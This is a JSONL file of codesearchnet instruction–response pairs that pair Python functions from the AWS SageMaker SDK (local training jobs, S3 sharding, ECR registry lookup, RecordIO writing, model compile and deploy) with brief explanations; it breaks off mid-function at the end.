{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create_training_job(self, TrainingJobName, AlgorithmSpecification, OutputDataConfig,\n                            ResourceConfig, InputDataConfig=None, **kwargs):\n        \"\"\"\n        Create a training job in Local Mode\n        Args:\n            TrainingJobName (str): local training job name.\n            AlgorithmSpecification (dict): Identifies the training algorithm to use.\n            InputDataConfig (dict): Describes the training dataset and the location where it is stored.\n            OutputDataConfig (dict): Identifies the location where you want to save the results of model training.\n            ResourceConfig (dict): Identifies the resources to use for local model traininig.\n            HyperParameters (dict) [optional]: Specifies these algorithm-specific parameters to influence the quality of\n                the final model.\n        \"\"\"\n        InputDataConfig = InputDataConfig or {}\n        container = _SageMakerContainer(ResourceConfig['InstanceType'], ResourceConfig['InstanceCount'],\n                                        AlgorithmSpecification['TrainingImage'], self.sagemaker_session)\n        training_job = _LocalTrainingJob(container)\n        hyperparameters = kwargs['HyperParameters'] if 'HyperParameters' in kwargs else {}\n        training_job.start(InputDataConfig, OutputDataConfig, hyperparameters, TrainingJobName)\n\n        LocalSagemakerClient._training_jobs[TrainingJobName] = training_job", "response": "Creates a training job in Local Mode."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef describe_training_job(self, TrainingJobName):\n        if TrainingJobName not in LocalSagemakerClient._training_jobs:\n            error_response = {'Error': {'Code': 'ValidationException', 'Message': 'Could not find local training job'}}\n            raise ClientError(error_response, 'describe_training_job')\n        else:\n            return LocalSagemakerClient._training_jobs[TrainingJobName].describe()", "response": "Describe a local training job."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a Local Model Object", "response": "def create_model(self, ModelName, PrimaryContainer, *args, **kwargs):  # pylint: disable=unused-argument\n        \"\"\"Create a Local Model Object\n\n        Args:\n            ModelName (str): the Model Name\n            PrimaryContainer (dict): a SageMaker primary container definition\n        \"\"\"\n        LocalSagemakerClient._models[ModelName] = _LocalModel(ModelName, PrimaryContainer)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _initialize(self, boto_session, sagemaker_client, sagemaker_runtime_client):\n\n        self.boto_session = boto_session or boto3.Session()\n        self._region_name = self.boto_session.region_name\n\n        if self._region_name is None:\n            raise ValueError('Must setup local AWS configuration with a region supported by SageMaker.')\n\n        self.sagemaker_client = LocalSagemakerClient(self)\n        self.sagemaker_runtime_client = LocalSagemakerRuntimeClient(self.config)\n        self.local_mode = True", "response": "Initialize this Local SageMaker Session."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\npreparing a container definition for the model.", "response": "def prepare_container_def(self, instance_type, accelerator_type=None):\n        \"\"\"Return a container definition with framework configuration set in model environment variables.\n\n        Args:\n            instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge'.\n            accelerator_type (str): The Elastic Inference accelerator type to deploy to the instance for loading and\n                making inferences to the model. For example, 'ml.eia1.medium'. Note: accelerator types are not\n                supported by SKLearnModel.\n\n        Returns:\n            dict[str, str]: A container definition object usable with the CreateModel API.\n        \"\"\"\n        if accelerator_type:\n            raise ValueError(\"Accelerator types are not supported for Scikit-Learn.\")\n\n        deploy_image = self.image\n        if not deploy_image:\n            image_tag = \"{}-{}-{}\".format(self.framework_version, \"cpu\", self.py_version)\n            deploy_image = default_framework_uri(\n                self.__framework_name__,\n                self.sagemaker_session.boto_region_name,\n                image_tag)\n\n        deploy_key_prefix = model_code_key_prefix(self.key_prefix, self.name, deploy_image)\n        self._upload_code(deploy_key_prefix)\n        deploy_env = dict(self.env)\n        deploy_env.update(self._framework_env_vars())\n\n        if self.model_server_workers:\n            deploy_env[MODEL_SERVER_WORKERS_PARAM_NAME.upper()] = str(self.model_server_workers)\n        return sagemaker.container_def(deploy_image, self.model_data, deploy_env)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupload the training array and labels arrays to num_shards s3 objects stored in s3://bucket / key_prefix /.", "response": "def upload_numpy_to_s3_shards(num_shards, s3, bucket, key_prefix, array, labels=None):\n    \"\"\"Upload the training ``array`` and ``labels`` arrays to ``num_shards`` s3 objects,\n    stored in \"s3://``bucket``/``key_prefix``/\".\"\"\"\n    shards = _build_shards(num_shards, array)\n    if labels is not None:\n        label_shards = _build_shards(num_shards, labels)\n    uploaded_files = []\n    if key_prefix[-1] != '/':\n        key_prefix = key_prefix + '/'\n    try:\n        for shard_index, shard in enumerate(shards):\n            with tempfile.TemporaryFile() as file:\n                if labels is not None:\n                    write_numpy_to_dense_tensor(file, shard, label_shards[shard_index])\n                else:\n                    write_numpy_to_dense_tensor(file, shard)\n                file.seek(0)\n                shard_index_string = str(shard_index).zfill(len(str(len(shards))))\n                file_name = \"matrix_{}.pbr\".format(shard_index_string)\n                key = key_prefix + file_name\n                logger.debug(\"Creating object {} in bucket {}\".format(key, bucket))\n                s3.Object(bucket, key).put(Body=file)\n                uploaded_files.append(file_name)\n        manifest_key = key_prefix + \".amazon.manifest\"\n        manifest_str = json.dumps(\n            [{'prefix': 's3://{}/{}'.format(bucket, key_prefix)}] + uploaded_files)\n        s3.Object(bucket, manifest_key).put(Body=manifest_str.encode('utf-8'))\n        return \"s3://{}/{}\".format(bucket, manifest_key)\n    except Exception as ex:  # pylint: disable=broad-except\n        try:\n            for file in uploaded_files:\n                s3.Object(bucket, key_prefix + file).delete()\n        finally:\n            raise ex"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the docker registry for the given AWS region.", "response": "def registry(region_name, algorithm=None):\n    \"\"\"Return docker registry for the given AWS region\n\n    Note: Not all the algorithms listed below have an Amazon Estimator implemented. For full list of\n    pre-implemented Estimators, look at:\n\n    https://github.com/aws/sagemaker-python-sdk/tree/master/src/sagemaker/amazon\n    \"\"\"\n    if algorithm in [None, 'pca', 'kmeans', 'linear-learner', 'factorization-machines', 'ntm',\n                     'randomcutforest', 'knn', 'object2vec', 'ipinsights']:\n        account_id = {\n            'us-east-1': '382416733822',\n            'us-east-2': '404615174143',\n            'us-west-2': '174872318107',\n            'eu-west-1': '438346466558',\n            'eu-central-1': '664544806723',\n            'ap-northeast-1': '351501993468',\n            'ap-northeast-2': '835164637446',\n            'ap-southeast-2': '712309505854',\n            'us-gov-west-1': '226302683700',\n            'ap-southeast-1': '475088953585',\n            'ap-south-1': '991648021394',\n            'ca-central-1': '469771592824',\n            'eu-west-2': '644912444149',\n            'us-west-1': '632365934929',\n            'us-iso-east-1': '490574956308',\n        }[region_name]\n    elif algorithm in ['lda']:\n        account_id = {\n            'us-east-1': '766337827248',\n            'us-east-2': '999911452149',\n            'us-west-2': '266724342769',\n            'eu-west-1': '999678624901',\n            'eu-central-1': '353608530281',\n            'ap-northeast-1': '258307448986',\n            'ap-northeast-2': '293181348795',\n            'ap-southeast-2': '297031611018',\n            'us-gov-west-1': '226302683700',\n            'ap-southeast-1': '475088953585',\n            'ap-south-1': '991648021394',\n            'ca-central-1': '469771592824',\n            'eu-west-2': '644912444149',\n            'us-west-1': '632365934929',\n            'us-iso-east-1': '490574956308',\n        }[region_name]\n    elif algorithm in ['forecasting-deepar']:\n        account_id = {\n            'us-east-1': '522234722520',\n            'us-east-2': '566113047672',\n            'us-west-2': '156387875391',\n            'eu-west-1': '224300973850',\n            'eu-central-1': '495149712605',\n            'ap-northeast-1': '633353088612',\n            'ap-northeast-2': '204372634319',\n            'ap-southeast-2': '514117268639',\n            'us-gov-west-1': '226302683700',\n            'ap-southeast-1': '475088953585',\n            'ap-south-1': '991648021394',\n            'ca-central-1': '469771592824',\n            'eu-west-2': '644912444149',\n            'us-west-1': '632365934929',\n            'us-iso-east-1': '490574956308',\n        }[region_name]\n    elif algorithm in ['xgboost', 'seq2seq', 'image-classification', 'blazingtext',\n                       'object-detection', 'semantic-segmentation']:\n        account_id = {\n            'us-east-1': '811284229777',\n            'us-east-2': '825641698319',\n            'us-west-2': '433757028032',\n            'eu-west-1': '685385470294',\n            'eu-central-1': '813361260812',\n            'ap-northeast-1': '501404015308',\n            'ap-northeast-2': '306986355934',\n            'ap-southeast-2': '544295431143',\n            'us-gov-west-1': '226302683700',\n            'ap-southeast-1': '475088953585',\n            'ap-south-1': '991648021394',\n            'ca-central-1': '469771592824',\n            'eu-west-2': '644912444149',\n            'us-west-1': '632365934929',\n            'us-iso-east-1': '490574956308',\n        }[region_name]\n    elif algorithm in ['image-classification-neo', 'xgboost-neo']:\n        account_id = {\n            'us-west-2': '301217895009',\n            'us-east-1': '785573368785',\n            'eu-west-1': '802834080501',\n            'us-east-2': '007439368137',\n        }[region_name]\n    else:\n        raise ValueError('Algorithm class:{} does not have mapping to account_id with images'.format(algorithm))\n\n    return get_ecr_image_uri_prefix(account_id, region_name)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_image_uri(region_name, repo_name, repo_version=1):\n    repo = '{}:{}'.format(repo_name, repo_version)\n    return '{}/{}'.format(registry(region_name, repo_name), repo)", "response": "Return algorithm image URI for the given AWS region repository name and repository version"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconvert the job description to init params that can be handled by the class constructor.", "response": "def _prepare_init_params_from_job_description(cls, job_details, model_channel_name=None):\n        \"\"\"Convert the job description to init params that can be handled by the class constructor\n\n        Args:\n            job_details: the returned job details from a describe_training_job API call.\n            model_channel_name (str): Name of the channel where pre-trained model data will be downloaded.\n\n        Returns:\n             dictionary: The transformed init_params\n\n        \"\"\"\n        init_params = super(AmazonAlgorithmEstimatorBase, cls)._prepare_init_params_from_job_description(\n            job_details, model_channel_name)\n\n        # The hyperparam names may not be the same as the class attribute that holds them,\n        # for instance: local_lloyd_init_method is called local_init_method. We need to map these\n        # and pass the correct name to the constructor.\n        for attribute, value in cls.__dict__.items():\n            if isinstance(value, hp):\n                if value.name in init_params['hyperparameters']:\n                    init_params[attribute] = init_params['hyperparameters'][value.name]\n\n        del init_params['hyperparameters']\n        del init_params['image']\n        return init_params"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nset hyperparameters needed for training.", "response": "def _prepare_for_training(self, records, mini_batch_size=None, job_name=None):\n        \"\"\"Set hyperparameters needed for training.\n\n        Args:\n            * records (:class:`~RecordSet`): The records to train this ``Estimator`` on.\n            * mini_batch_size (int or None): The size of each mini-batch to use when training. If ``None``, a\n                default value will be used.\n            * job_name (str): Name of the training job to be created. If not specified, one is generated,\n                using the base name given to the constructor if applicable.\n        \"\"\"\n        super(AmazonAlgorithmEstimatorBase, self)._prepare_for_training(job_name=job_name)\n\n        feature_dim = None\n\n        if isinstance(records, list):\n            for record in records:\n                if record.channel == 'train':\n                    feature_dim = record.feature_dim\n                    break\n            if feature_dim is None:\n                raise ValueError('Must provide train channel.')\n        else:\n            feature_dim = records.feature_dim\n\n        self.feature_dim = feature_dim\n        self.mini_batch_size = mini_batch_size"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nfitting this Estimator on serialized Record objects stored in S3 and store them in S3.", "response": "def fit(self, records, mini_batch_size=None, wait=True, logs=True, job_name=None):\n        \"\"\"Fit this Estimator on serialized Record objects, stored in S3.\n\n        ``records`` should be an instance of :class:`~RecordSet`. This defines a collection of\n        S3 data files to train this ``Estimator`` on.\n\n        Training data is expected to be encoded as dense or sparse vectors in the \"values\" feature\n        on each Record. If the data is labeled, the label is expected to be encoded as a list of\n        scalas in the \"values\" feature of the Record label.\n\n        More information on the Amazon Record format is available at:\n        https://docs.aws.amazon.com/sagemaker/latest/dg/cdf-training.html\n\n        See :meth:`~AmazonAlgorithmEstimatorBase.record_set` to construct a ``RecordSet`` object\n        from :class:`~numpy.ndarray` arrays.\n\n        Args:\n            records (:class:`~RecordSet`): The records to train this ``Estimator`` on\n            mini_batch_size (int or None): The size of each mini-batch to use when training. If ``None``, a\n                default value will be used.\n            wait (bool): Whether the call should wait until the job completes (default: True).\n            logs (bool): Whether to show the logs produced by the job.\n                Only meaningful when wait is True (default: True).\n            job_name (str): Training job name. If not specified, the estimator generates a default job name,\n                based on the training image name and current timestamp.\n        \"\"\"\n        self._prepare_for_training(records, job_name=job_name, mini_batch_size=mini_batch_size)\n\n        self.latest_training_job = _TrainingJob.start_new(self, records)\n        if wait:\n            self.latest_training_job.wait(logs=logs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds a RecordSet from a 2D numpy matrix and label vector.", "response": "def record_set(self, train, labels=None, channel=\"train\"):\n        \"\"\"Build a :class:`~RecordSet` from a numpy :class:`~ndarray` matrix and label vector.\n\n        For the 2D ``ndarray`` ``train``, each row is converted to a :class:`~Record` object.\n        The vector is stored in the \"values\" entry of the ``features`` property of each Record.\n        If ``labels`` is not None, each corresponding label is assigned to the \"values\" entry\n        of the ``labels`` property of each Record.\n\n        The collection of ``Record`` objects are protobuf serialized and uploaded to new\n        S3 locations. A manifest file is generated containing the list of objects created and\n        also stored in S3.\n\n        The number of S3 objects created is controlled by the ``train_instance_count`` property\n        on this Estimator. One S3 object is created per training instance.\n\n        Args:\n            train (numpy.ndarray): A 2D numpy array of training data.\n            labels (numpy.ndarray): A 1D numpy array of labels. Its length must be equal to the\n               number of rows in ``train``.\n            channel (str): The SageMaker TrainingJob channel this RecordSet should be assigned to.\n        Returns:\n            RecordSet: A RecordSet referencing the encoded, uploading training and label data.\n        \"\"\"\n        s3 = self.sagemaker_session.boto_session.resource('s3')\n        parsed_s3_url = urlparse(self.data_location)\n        bucket, key_prefix = parsed_s3_url.netloc, parsed_s3_url.path\n        key_prefix = key_prefix + '{}-{}/'.format(type(self).__name__, sagemaker_timestamp())\n        key_prefix = key_prefix.lstrip('/')\n        logger.debug('Uploading to bucket {} and key_prefix {}'.format(bucket, key_prefix))\n        manifest_s3_file = upload_numpy_to_s3_shards(self.train_instance_count, s3, bucket, key_prefix, train, labels)\n        logger.debug(\"Created manifest file {}\".format(manifest_s3_file))\n        return RecordSet(manifest_s3_file, num_records=train.shape[0], feature_dim=train.shape[1], channel=channel)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_data_source_instance(data_source, sagemaker_session):\n    parsed_uri = urlparse(data_source)\n    if parsed_uri.scheme == 'file':\n        return LocalFileDataSource(parsed_uri.netloc + parsed_uri.path)\n    elif parsed_uri.scheme == 's3':\n        return S3DataSource(parsed_uri.netloc, parsed_uri.path, sagemaker_session)", "response": "Return an instance of a Data Source that can handle the provided data_source URI."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_splitter_instance(split_type):\n    if split_type is None:\n        return NoneSplitter()\n    elif split_type == 'Line':\n        return LineSplitter()\n    elif split_type == 'RecordIO':\n        return RecordIOSplitter()\n    else:\n        raise ValueError('Invalid Split Type: %s' % split_type)", "response": "Returns an Instance of a Splitter according to\n            the specified split_type."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns an Instance of a BatchStrategy according to strategy", "response": "def get_batch_strategy_instance(strategy, splitter):\n    \"\"\"Return an Instance of :class:`sagemaker.local.data.BatchStrategy` according to `strategy`\n\n    Args:\n        strategy (str): Either 'SingleRecord' or 'MultiRecord'\n        splitter (:class:`sagemaker.local.data.Splitter): splitter to get the data from.\n\n    Returns\n        :class:`sagemaker.local.data.BatchStrategy`: an Instance of a BatchStrategy\n    \"\"\"\n    if strategy == 'SingleRecord':\n        return SingleRecordStrategy(splitter)\n    elif strategy == 'MultiRecord':\n        return MultiRecordStrategy(splitter)\n    else:\n        raise ValueError('Invalid Batch Strategy: %s - Valid Strategies: \"SingleRecord\", \"MultiRecord\"')"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving the list of absolute paths to all the files in this data source.", "response": "def get_file_list(self):\n        \"\"\"Retrieve the list of absolute paths to all the files in this data source.\n\n        Returns:\n             List[str] List of absolute paths.\n        \"\"\"\n        if os.path.isdir(self.root_path):\n            return [os.path.join(self.root_path, f) for f in os.listdir(self.root_path)\n                    if os.path.isfile(os.path.join(self.root_path, f))]\n        else:\n            return [self.root_path]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_root_dir(self):\n        if os.path.isdir(self.root_path):\n            return self.root_path\n        else:\n            return os.path.dirname(self.root_path)", "response": "Retrieve the absolute path to the root directory of this data source."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsplitting a file into individual RecordIO records using a specific strategy", "response": "def split(self, file):\n        \"\"\"Split a file into records using a specific strategy\n\n        This RecordIOSplitter splits the data into individual RecordIO records.\n\n        Args:\n            file (str): path to the file to split\n\n        Returns: generator for the individual records that were split from the file\n        \"\"\"\n        with open(file, 'rb') as f:\n            for record in sagemaker.amazon.common.read_recordio(f):\n                yield record"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef pad(self, file, size=6):\n        buffer = ''\n        for element in self.splitter.split(file):\n            if _payload_size_within_limit(buffer + element, size):\n                buffer += element\n            else:\n                tmp = buffer\n                buffer = element\n                yield tmp\n        if _validate_payload_size(buffer, size):\n            yield buffer", "response": "Returns a generator that yields the specified size of the records in file."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef pad(self, file, size=6):\n        for element in self.splitter.split(file):\n            if _validate_payload_size(element, size):\n                yield element", "response": "Returns a generator that yields all the records in the specified size."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn hyperparameters used by your custom Chainer code during training.", "response": "def hyperparameters(self):\n        \"\"\"Return hyperparameters used by your custom Chainer code during training.\"\"\"\n        hyperparameters = super(Chainer, self).hyperparameters()\n\n        additional_hyperparameters = {Chainer._use_mpi: self.use_mpi,\n                                      Chainer._num_processes: self.num_processes,\n                                      Chainer._process_slots_per_host: self.process_slots_per_host,\n                                      Chainer._additional_mpi_options: self.additional_mpi_options}\n\n        # remove unset keys.\n        additional_hyperparameters = {k: v for k, v in additional_hyperparameters.items() if v}\n        hyperparameters.update(Framework._json_encode_hyperparameters(additional_hyperparameters))\n        return hyperparameters"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a SageMaker ChainerModel object that can be deployed to an Endpoint.", "response": "def create_model(self, model_server_workers=None, role=None, vpc_config_override=VPC_CONFIG_DEFAULT):\n        \"\"\"Create a SageMaker ``ChainerModel`` object that can be deployed to an ``Endpoint``.\n\n        Args:\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used during\n                transform jobs. If not specified, the role from the Estimator will be used.\n            model_server_workers (int): Optional. The number of worker processes used by the inference server.\n                If None, server will use one worker per vCPU.\n            vpc_config_override (dict[str, list[str]]): Optional override for VpcConfig set on the model.\n                Default: use subnets and security groups from this Estimator.\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n\n        Returns:\n            sagemaker.chainer.model.ChainerModel: A SageMaker ``ChainerModel`` object.\n                See :func:`~sagemaker.chainer.model.ChainerModel` for full details.\n        \"\"\"\n        role = role or self.role\n        return ChainerModel(self.model_data, role, self.entry_point, source_dir=self._model_source_dir(),\n                            enable_cloudwatch_metrics=self.enable_cloudwatch_metrics, name=self._current_job_name,\n                            container_log_level=self.container_log_level, code_location=self.code_location,\n                            py_version=self.py_version, framework_version=self.framework_version,\n                            model_server_workers=model_server_workers, image=self.image_name,\n                            sagemaker_session=self.sagemaker_session,\n                            vpc_config=self.get_vpc_config(vpc_config_override), dependencies=self.dependencies)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconvert the job description to init params that can be handled by the class constructor.", "response": "def _prepare_init_params_from_job_description(cls, job_details, model_channel_name=None):\n        \"\"\"Convert the job description to init params that can be handled by the class constructor\n\n        Args:\n            job_details: the returned job details from a describe_training_job API call.\n            model_channel_name (str): Name of the channel where pre-trained model data will be downloaded.\n\n        Returns:\n             dictionary: The transformed init_params\n\n        \"\"\"\n        init_params = super(Chainer, cls)._prepare_init_params_from_job_description(job_details, model_channel_name)\n\n        for argument in [Chainer._use_mpi, Chainer._num_processes, Chainer._process_slots_per_host,\n                         Chainer._additional_mpi_options]:\n\n            value = init_params['hyperparameters'].pop(argument, None)\n            if value:\n                init_params[argument[len('sagemaker_'):]] = value\n\n        image_name = init_params.pop('image')\n        framework, py_version, tag, _ = framework_name_from_image(image_name)\n\n        if not framework:\n            # If we were unable to parse the framework name from the image it is not one of our\n            # officially supported images, in this case just add the image to the init params.\n            init_params['image_name'] = image_name\n            return init_params\n\n        init_params['py_version'] = py_version\n        init_params['framework_version'] = framework_version_from_tag(tag)\n\n        training_job_name = init_params['base_job_name']\n\n        if framework != cls.__framework_name__:\n            raise ValueError(\"Training job: {} didn't use image for requested framework\".format(training_job_name))\n        return init_params"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef write_numpy_to_dense_tensor(file, array, labels=None):\n\n    # Validate shape of array and labels, resolve array and label types\n    if not len(array.shape) == 2:\n        raise ValueError(\"Array must be a Matrix\")\n    if labels is not None:\n        if not len(labels.shape) == 1:\n            raise ValueError(\"Labels must be a Vector\")\n        if labels.shape[0] not in array.shape:\n            raise ValueError(\"Label shape {} not compatible with array shape {}\".format(\n                             labels.shape, array.shape))\n        resolved_label_type = _resolve_type(labels.dtype)\n    resolved_type = _resolve_type(array.dtype)\n\n    # Write each vector in array into a Record in the file object\n    record = Record()\n    for index, vector in enumerate(array):\n        record.Clear()\n        _write_feature_tensor(resolved_type, record, vector)\n        if labels is not None:\n            _write_label_tensor(resolved_label_type, record, labels[index])\n        _write_recordio(file, record.SerializeToString())", "response": "Writes a numpy array to a dense tensor."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nwrites a scipy sparse matrix to a sparse tensor.", "response": "def write_spmatrix_to_sparse_tensor(file, array, labels=None):\n    \"\"\"Writes a scipy sparse matrix to a sparse tensor\"\"\"\n\n    if not issparse(array):\n        raise TypeError(\"Array must be sparse\")\n\n    # Validate shape of array and labels, resolve array and label types\n    if not len(array.shape) == 2:\n        raise ValueError(\"Array must be a Matrix\")\n    if labels is not None:\n        if not len(labels.shape) == 1:\n            raise ValueError(\"Labels must be a Vector\")\n        if labels.shape[0] not in array.shape:\n            raise ValueError(\"Label shape {} not compatible with array shape {}\".format(\n                             labels.shape, array.shape))\n        resolved_label_type = _resolve_type(labels.dtype)\n    resolved_type = _resolve_type(array.dtype)\n\n    csr_array = array.tocsr()\n    n_rows, n_cols = csr_array.shape\n\n    record = Record()\n    for row_idx in range(n_rows):\n        record.Clear()\n        row = csr_array.getrow(row_idx)\n        # Write values\n        _write_feature_tensor(resolved_type, record, row.data)\n        # Write keys\n        _write_keys_tensor(resolved_type, record, row.indices.astype(np.uint64))\n\n        # Write labels\n        if labels is not None:\n            _write_label_tensor(resolved_label_type, record, labels[row_idx])\n\n        # Write shape\n        _write_shape(resolved_type, record, n_cols)\n\n        _write_recordio(file, record.SerializeToString())"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nwrites a single data point as a RecordIO record to the given file.", "response": "def _write_recordio(f, data):\n    \"\"\"Writes a single data point as a RecordIO record to the given file.\"\"\"\n    length = len(data)\n    f.write(struct.pack('I', _kmagic))\n    f.write(struct.pack('I', length))\n    pad = (((length + 3) >> 2) << 2) - length\n    f.write(data)\n    f.write(padding[pad])"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nprepares a container definition for deploying this model to a specific instance type.", "response": "def prepare_container_def(self, instance_type, accelerator_type=None):  # pylint: disable=unused-argument\n        \"\"\"Return a dict created by ``sagemaker.container_def()`` for deploying this model to a specified instance type.\n\n        Subclasses can override this to provide custom container definitions for\n        deployment to a specific instance type. Called by ``deploy()``.\n\n        Args:\n            instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge'.\n            accelerator_type (str): The Elastic Inference accelerator type to deploy to the instance for loading and\n                making inferences to the model. For example, 'ml.eia1.medium'.\n\n        Returns:\n            dict: A container definition object usable with the CreateModel API.\n        \"\"\"\n        return sagemaker.container_def(self.image, self.model_data, self.env)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a SageMaker Model Entity MimeType", "response": "def _create_sagemaker_model(self, instance_type, accelerator_type=None, tags=None):\n        \"\"\"Create a SageMaker Model Entity\n\n        Args:\n            instance_type (str): The EC2 instance type that this Model will be used for, this is only\n                used to determine if the image needs GPU support or not.\n            accelerator_type (str): Type of Elastic Inference accelerator to attach to an endpoint for model loading\n                and inference, for example, 'ml.eia1.medium'. If not specified, no Elastic Inference accelerator\n                will be attached to the endpoint.\n            tags(List[dict[str, str]]): Optional. The list of tags to add to the model. Example:\n                    >>> tags = [{'Key': 'tagname', 'Value': 'tagvalue'}]\n                    For more information about tags, see https://boto3.amazonaws.com/v1/documentation\\\n                    /api/latest/reference/services/sagemaker.html#SageMaker.Client.add_tags\n\n        \"\"\"\n        container_def = self.prepare_container_def(instance_type, accelerator_type=accelerator_type)\n        self.name = self.name or utils.name_from_image(container_def['Image'])\n        enable_network_isolation = self.enable_network_isolation()\n        self.sagemaker_session.create_model(self.name, self.role,\n                                            container_def, vpc_config=self.vpc_config,\n                                            enable_network_isolation=enable_network_isolation,\n                                            tags=tags)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef compile(self, target_instance_family, input_shape, output_path, role,\n                tags=None, job_name=None, compile_max_run=5 * 60, framework=None, framework_version=None):\n        \"\"\"Compile this ``Model`` with SageMaker Neo.\n\n        Args:\n            target_instance_family (str): Identifies the device that you want to run your model after compilation, for\n                example: ml_c5. Allowed strings are: ml_c5, ml_m5, ml_c4, ml_m4, jetsontx1, jetsontx2, ml_p2, ml_p3,\n                deeplens, rasp3b\n            input_shape (dict): Specifies the name and shape of the expected inputs for your trained model in json\n                dictionary form, for example: {'data':[1,3,1024,1024]}, or {'var1': [1,1,28,28], 'var2':[1,1,28,28]}\n            output_path (str): Specifies where to store the compiled model\n            role (str): Execution role\n            tags (list[dict]): List of tags for labeling a compilation job. For more, see\n                https://docs.aws.amazon.com/sagemaker/latest/dg/API_Tag.html.\n            job_name (str): The name of the compilation job\n            compile_max_run (int): Timeout in seconds for compilation (default: 3 * 60).\n                After this amount of time Amazon SageMaker Neo terminates the compilation job regardless of its\n                current status.\n            framework (str): The framework that is used to train the original model. Allowed values: 'mxnet',\n                'tensorflow', 'pytorch', 'onnx', 'xgboost'\n            framework_version (str)\n        Returns:\n            sagemaker.model.Model: A SageMaker ``Model`` object. See :func:`~sagemaker.model.Model` for full details.\n        \"\"\"\n        framework = self._framework() or framework\n        if framework is None:\n            raise ValueError(\"You must specify framework, allowed values {}\".format(NEO_ALLOWED_FRAMEWORKS))\n        if framework not in NEO_ALLOWED_FRAMEWORKS:\n            raise ValueError(\"You must provide valid framework, allowed values {}\".format(NEO_ALLOWED_FRAMEWORKS))\n        if job_name is None:\n            raise ValueError(\"You must provide a compilation job name\")\n\n        framework = framework.upper()\n        framework_version = self._get_framework_version() or framework_version\n\n        config = self._compilation_job_config(target_instance_family, input_shape, output_path, role,\n                                              compile_max_run, job_name, framework, tags)\n        self.sagemaker_session.compile_model(**config)\n        job_status = self.sagemaker_session.wait_for_compilation_job(job_name)\n        self.model_data = job_status['ModelArtifacts']['S3ModelArtifacts']\n        if target_instance_family.startswith('ml_'):\n            self.image = self._neo_image(self.sagemaker_session.boto_region_name, target_instance_family, framework,\n                                         framework_version)\n            self._is_compiled_model = True\n        else:\n            LOGGER.warning(\"The intance type {} is not supported to deploy via SageMaker,\"\n                           \"please deploy the model on the device by yourself.\".format(target_instance_family))\n        return self", "response": "Compile this model with SageMaker Neo."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndeploy this model to an Amazon SageMaker Endpoint and optionally return a Predictor.", "response": "def deploy(self, initial_instance_count, instance_type, accelerator_type=None, endpoint_name=None,\n               update_endpoint=False, tags=None, kms_key=None):\n        \"\"\"Deploy this ``Model`` to an ``Endpoint`` and optionally return a ``Predictor``.\n\n        Create a SageMaker ``Model`` and ``EndpointConfig``, and deploy an ``Endpoint`` from this ``Model``.\n        If ``self.predictor_cls`` is not None, this method returns a the result of invoking\n        ``self.predictor_cls`` on the created endpoint name.\n\n        The name of the created model is accessible in the ``name`` field of this ``Model`` after deploy returns\n\n        The name of the created endpoint is accessible in the ``endpoint_name``\n        field of this ``Model`` after deploy returns.\n\n        Args:\n            instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge'.\n            initial_instance_count (int): The initial number of instances to run in the\n                ``Endpoint`` created from this ``Model``.\n            accelerator_type (str): Type of Elastic Inference accelerator to deploy this model for model loading\n                and inference, for example, 'ml.eia1.medium'. If not specified, no Elastic Inference accelerator\n                will be attached to the endpoint.\n                For more information: https://docs.aws.amazon.com/sagemaker/latest/dg/ei.html\n            endpoint_name (str): The name of the endpoint to create (default: None).\n                If not specified, a unique endpoint name will be created.\n            update_endpoint (bool): Flag to update the model in an existing Amazon SageMaker endpoint.\n                If True, this will deploy a new EndpointConfig to an already existing endpoint and delete resources\n                corresponding to the previous EndpointConfig. If False, a new endpoint will be created. Default: False\n            tags(List[dict[str, str]]): The list of tags to attach to this specific endpoint.\n            kms_key (str): The ARN of the KMS key that is used to encrypt the data on the\n                storage volume attached to the instance hosting the endpoint.\n\n        Returns:\n            callable[string, sagemaker.session.Session] or None: Invocation of ``self.predictor_cls`` on\n                the created endpoint name, if ``self.predictor_cls`` is not None. Otherwise, return None.\n        \"\"\"\n        if not 